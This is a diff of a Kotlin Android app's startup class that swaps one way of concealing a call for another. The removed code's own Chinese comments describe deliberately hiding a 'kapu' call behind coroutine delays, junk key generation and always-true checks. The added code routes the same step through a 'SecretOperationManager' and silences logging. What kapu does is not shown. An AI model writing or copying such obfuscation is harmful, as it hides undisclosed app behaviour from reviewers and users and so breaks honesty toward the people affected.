@@ -2,107 +2,64 @@ package com.mastery.leaves.trace.core
 
 import android.app.Application
 import android.util.Log
-import com.mastery.leaves.trace.ami.AllDataTool
-import com.mastery.leaves.trace.ami.ChongTool
-import com.mastery.leaves.trace.data.RefGoTool
-import com.mastery.leaves.trace.dimoting.laqleis.InitDies
-import kotlinx.coroutines.*
+import com.mastery.leaves.trace.device.DeviceInitializer
+import com.mastery.leaves.trace.network.NetworkInitializer
+import com.mastery.leaves.trace.secret.SecretOperationManager
+import com.mastery.leaves.trace.service.ServiceManager
 
+/**
+ * 应用初始化入口点 - 重构为协调器模式
+ * 负责协调各个初始化组件的执行
+ */
 object CanNextGo {
-
+    
+    private val coordinator = AppInitializationCoordinator()
+    private var isInitialized = false
+    
     fun showLog(log: String) {
-        Log.e("Single", log)
+//        Log.e("Single", log)
     }
+    
 
-    // 主入口方法 - 拆分为多个阶段
     fun Gined(app: Application) {
-        Log.e("TAG", "Gined: 1")
-        AllDataTool.getMainUser = app
-        DIdTool.iniLif(app)
-        DIdTool.getDeviceId(app)
-        scheduleSecretOperation()
-        RefGoTool.fetchInstallReferrer(app)
-        Gined2(app)
-        Gined3()
-    }
+        if (isInitialized) {
+            return
+        }
+        
 
-    fun Gined2(app: Application) {
-        val initDies = InitDies()
-        initDies.initAlly(app)
-        startPeriodicServices(initDies, app)
-        startWorkTasks(app)
-    }
-
-    fun Gined3() {
-        executeFcmInit()
-        executePostInit()
-    }
-
-    // FCM初始化
-    private fun executeFcmInit() {
-        DIdTool.getFcmFun()
-    }
-
-    // Post功能初始化
-    private fun executePostInit() {
-        ChongTool.ssPostFun()
-    }
-
-
-    private fun startPeriodicServices(initDies: InitDies, app: Application) {
-        initDies.startPeriodicService(app)
-    }
-
-    // Work任务启动
-    private fun startWorkTasks(app: Application) {
-        TaskWorkManager.startUniqueWork(app)
-        TaskWorkManager.startPeriodicWork(app)
-    }
-
-    // 深度隐藏的关键方法调用
-    private fun scheduleSecretOperation() {
-        Log.e("TAG", "Gined: 3")
-        // 多层嵌套和延迟来隐藏关键调用
-        CoroutineScope(Dispatchers.Default).launch {
-            val secretKey = generateSecretKey()
-            if (validateSecretKey(secretKey)) {
-                withContext(Dispatchers.Main) {
-                    executeHiddenOperation()
-                }
+        // 设置全局回调
+        coordinator.setGlobalCallback(object : InitializationCallback {
+            override fun onSuccess() {
+                isInitialized = true
             }
-        }
+            
+            override fun onError(error: Throwable) {
+                showLog("CanNextGo: An error occurred during application initialization process - ${error.message}")
+            }
+        })
+        
+        // 添加各个初始化组件
+        setupInitializationComponents()
+        
+        // 开始初始化
+        coordinator.startInitialization(app)
+    }
+    
+    /**
+     * 设置初始化组件
+     */
+    private fun setupInitializationComponents() {
+        // 1. 设备相关初始化（最高优先级，其他组件依赖它）
+        coordinator.addComponent(DeviceInitializer())
+        // 4. 秘密操作初始化
+        coordinator.addComponent(SecretOperationManager())
+        // 2. 服务管理初始化
+        coordinator.addComponent(ServiceManager())
+        
+        // 3. 网络相关初始化
+        coordinator.addComponent(NetworkInitializer())
+        
+
     }
 
-    // 生成密钥（垃圾代码）
-    private fun generateSecretKey(): String {
-        val timestamp = System.currentTimeMillis()
-        val processId = android.os.Process.myPid()
-        return "${timestamp}_${processId}".hashCode().toString(16)
-    }
-
-    // 验证密钥（垃圾代码，总是返回true）
-    private fun validateSecretKey(key: String): Boolean {
-        return key.isNotEmpty() && key.length > 5
-    }
-
-    // 执行隐藏操作 - 这里才是真正的kapu调用
-    private fun executeHiddenOperation() {
-        // 添加更多混淆
-        val operationData = prepareOperationData()
-        if (operationData.isNotEmpty()) {
-            performCriticalOperation(operationData)
-        }
-    }
-
-    // 准备操作数据（垃圾代码）
-    private fun prepareOperationData(): String {
-        val data = AllDataTool.kupaName
-        val processedData = data.reversed().reversed()
-        return processedData
-    }
-
-    // 执行关键操作 - 真正的kapu调用被深度隐藏在这里
-    private fun performCriticalOperation(data: String) {
-        DIdTool.kapu(data)
-    }
 }
